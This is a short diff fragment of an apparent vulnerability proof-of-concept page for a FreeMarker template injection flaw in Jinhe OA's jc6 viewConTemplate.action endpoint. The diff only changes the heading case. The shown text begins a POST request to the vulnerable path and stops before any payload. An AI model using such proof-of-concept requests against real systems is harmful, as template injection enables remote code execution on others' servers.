@@ -1,7 +1,7 @@
 ## 金和OA_jc6_viewConTemplate.action存在FreeMarker模板注入漏洞
 
 
-## poc
+## POC
 ```
 POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
 Host: your-ip
